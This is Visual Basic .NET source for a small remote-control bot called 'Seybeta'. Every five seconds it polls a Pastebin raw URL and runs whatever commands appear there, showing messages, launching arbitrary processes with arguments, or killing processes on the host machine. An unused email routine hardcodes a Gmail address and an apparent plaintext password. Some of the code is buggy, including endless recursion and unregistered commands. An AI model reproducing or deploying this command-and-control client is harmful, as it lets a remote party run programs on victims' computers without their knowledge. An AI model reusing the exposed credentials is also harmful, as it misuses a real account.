Imports System
Imports System.Windows.Forms
Imports System.IO
Imports System.Text.RegularExpressions
Imports System.Collections.Generic
Imports System.Linq
Imports System.Diagnostics
Imports System.ComponentModel
Imports System.Net.Mail
Imports System.Net

Namespace Seybeta
    Class Main
        Const Beta As Boolean = True
        Dim sFilePath As String = String.Empty
        Dim oCommands As New List(Of Command)

        Dim oWebClient As New Net.WebClient
        Dim iTicks As Integer = 0
        Dim sLastCommand As String = String.Empty
        Dim sNewCommand As String = String.Empty

        Public Function Main() As Object
            If (Beta) Then
                Me.sFilePath = "http://pastebin.com/raw.php?i=9tXwz5nm"
            Else
                Me.sFilePath = "http://pastebin.com/raw.php?i=gUpQiCHs"
            End If

            Me.Init()
            Me.Tick()

            Return 0
        End Function

        Public Sub Init()
            Me.oCommands.Add(New MessageCommand())
            Me.oCommands.Add(New ProcessStartCommand())
            Me.oCommands.Add(New ProcessKillCommand())

            Dim oStreamReader As StreamReader = New StreamReader(Me.oWebClient.OpenRead(Me.sFilePath))
            Me.sLastCommand = oStreamReader.ReadToEnd.ToString()
            oStreamReader.Dispose()
        End Sub

        Public Sub Tick()
            Me.Ping()

            Threading.Thread.Sleep(5000)
            Me.Tick()
        End Sub

        Public Sub Ping()
            Dim oStreamReader As StreamReader = New StreamReader(Me.oWebClient.OpenRead(Me.sFilePath))
            Me.sNewCommand = oStreamReader.ReadToEnd.ToString()
            oStreamReader.Dispose()

            If Not (Me.sNewCommand = Me.sLastCommand) Then
                Me.Parse(Me.sNewCommand)
            End If

            Me.sLastCommand = Me.sNewCommand
        End Sub

        Public Sub Parse(ByVal sCommand As String)
            For Each oCommand As Command In Me.oCommands
                oCommand.Parse(sCommand)
            Next
        End Sub
    End Class

    MustInherit Class Command
        Dim _sName As String
        Dim _oArguments As Dictionary(Of Char, String)

        Public Sub New(ByVal sName As String)
            Me.Name = sName
        End Sub

        Public MustOverride Sub Action(ByVal oArguments As Dictionary(Of Char, String))

        Public Function Parse(ByVal sCommand As String) As Boolean
            Dim sDashSplit As List(Of String) = sCommand.Split("-").ToList()
            Dim sName As String = sDashSplit(0).Replace(" ", String.Empty)

            If Not (sName.ToLower.Equals(Me.Name.ToLower)) Then
                Return False
            End If

            Dim oArguments As New Dictionary(Of Char, String)

            For Each sArgument As String In sDashSplit
                If (sArgument.Equals(sDashSplit(0))) Then
                    Continue For
                End If

                Dim oParts As New List(Of String)

                For Each sPart As Match In Regex.Matches(sArgument, "[^\s""']+|""([^""]*)""|'([^']*)'")
                    Dim sResult = sPart.Value

                    If (sPart.Value.Substring(0, 1) = """") Then
                        If (sPart.Value.Substring(sPart.Value.Length - 1, 1) = """") Then
                            sResult = sPart.Value.Substring(1, sPart.Value.Length - 2)
                        End If
                    End If

                    oParts.Add(sResult)
                Next

                oArguments.Add(oParts(0), oParts(1))
            Next

            Try
                Me._oArguments = oArguments
                Me.Action(oArguments)
            Catch oException As Exception
                Console.WriteLine(oException.Message)
            End Try

            Return True
        End Function

        Public Function Arg(ByVal sArgument As String) As String
            Try
                Dim sValue As String = Me._oArguments(sArgument)
                Return sValue
            Catch oException As Exception
                Console.WriteLine(oException.Message + " [ARGUMENT (" + sArgument + ")]")
                Return String.Empty
            End Try
        End Function

        Public Function Reset(ByVal sValue As String, ByVal sReset As String) As String
            If (sValue.Equals(String.Empty)) Then
                Return sReset
            Else
                Return sValue
            End If
        End Function

        Public Property Name() As String
            Get
                Return Me._sName
            End Get
            Set(sName As String)
                Me._sName = sName
            End Set
        End Property
    End Class

    Class MessageCommand
        Inherits Command

        Sub New()
            MyBase.New("Message")
        End Sub

        Public Overrides Sub Action(ByVal oArguments As Dictionary(Of Char, String))
            MessageBox.Show(Me.Arg("m"), Me.Reset(Me.Arg("t"), "Message"))
        End Sub
    End Class

    Class ProcessStartCommand
        Inherits Command

        Sub New()
            MyBase.New("ProcessStart")
        End Sub

        Public Overrides Sub Action(ByVal oArguments As Dictionary(Of Char, String))
            Process.Start(Me.Arg("p"), Me.Arg("a"))
        End Sub
    End Class

    Class ProcessKillCommand
        Inherits Command

        Sub New()
            MyBase.New("ProcessKill")
        End Sub

        Public Overrides Sub Action(ByVal oArguments As Dictionary(Of Char, String))
            For Each oProcess As Process In Process.GetProcessesByName(Me.Arg("p"))
                oProcess.Kill()
            Next
        End Sub
    End Class

    Class AbortCommand
        Inherits Command

        Sub New()
            MyBase.New("Abort")
        End Sub

        Public Overrides Sub Action(oArguments As Dictionary(Of Char, String))
            Application.Exit()
        End Sub
    End Class

    Class EmailCommand
        Inherits Command

        Sub New()
            MyBase.New("Email")
        End Sub

        Public Overrides Sub Action(oArguments As Dictionary(Of Char, String))
            Dim oSmtp As New SmtpClient("smtp.gmail.com", 465)
            oSmtp.EnableSsl = True

            Dim oMail As New MailMessage
            oMail.Subject = "Seybeta"
            oMail.From = New MailAddress("Aoredon@gmail.com")

            oSmtp.Credentials = New NetworkCredential("Aoredon@gmail.com", "CabbagePatchManAlex")
            oMail.To.Add("Aoredon@gmail.com")
            oMail.Body = "Test."
            oSmtp.Port = "587"
            oSmtp.Send(oMail)
        End Sub
    End Class
End Namespace